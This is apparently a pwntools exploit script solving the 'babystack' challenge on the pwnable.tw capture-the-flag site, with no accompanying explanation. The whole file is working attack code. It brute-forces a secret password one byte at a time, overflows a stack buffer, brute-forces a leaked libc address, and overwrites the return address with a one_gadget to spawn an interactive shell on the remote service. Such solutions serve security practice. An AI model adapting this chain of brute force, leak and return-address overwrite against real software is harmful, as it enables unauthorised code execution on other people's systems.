#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./babystack_patched')
libc = ELF('./libc_64.so.6')
p = process(elf.path)
p = remote("chall.pwnable.tw", 10205)

# Bruteforce to find random password 
random_password = b'' 

for i in range(16):
    for j in range(1, 256):
        # Option: login 
        p.sendafter(b'>> ', b'1')
        password = b''.join([p8(k) for k in random_password]) + p8(j) + b'\x00'
        print(password)
        p.sendafter(b'Your passowrd :', password)

        if not b'Failed !\n' in p.recvline(): 
            random_password += p8(j) 
            p.sendafter(b'>> ', b'1')
            break

p.sendafter(b'>> ', b'1')
payload = b'x'*72
p.sendafter(b'Your passowrd :', payload) 

p.sendafter(b'>> ', b'1')
p.sendafter(b'Your passowrd :', p64(0))

p.sendafter(b'>> ', b'3')
p.sendafter(b'Copy :', b'cccccccc')

p.sendafter(b'>> ', b'1')

# Bruteforce to find libc 
libc_leaked = b'' 

for i in range(5):
    for j in range(1, 256):
        # Option: login 
        p.sendafter(b'>> ', b'1')
        libc_buf = b'x'*8 + b''.join([p8(k) for k in libc_leaked]) + p8(j) + b'\x00'
        print(libc_buf)
        p.sendafter(b'Your passowrd :', libc_buf)

        if not b'Failed !\n' in p.recvline(): 
            libc_leaked += p8(j) 
            p.sendafter(b'>> ', b'1')
            break

libc_leaked += b'\x7f\x00\x00'
libc_leaked = u64(libc_leaked)
log.info('libc_leaked: ', hex(libc_leaked))

libc.address = libc_leaked - (libc.symbols["__GI__IO_file_setbuf"] + 9)

gadgets = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
one_gadget = libc.address + gadgets[0]

payload = b'a'*64 + random_password + b'a'*24 + p64(one_gadget)
p.sendafter(b'>> ', b'1')
p.sendafter(b'Your passowrd :', payload)

p.sendafter(b'>> ', b'1')
p.sendafter(b'Your passowrd :', b'\x00')
p.sendafter(b'>> ', b'3')
p.sendafter(b'Copy :', b'dddd')

p.sendafter(b'>> ', b'2')

p.interactive()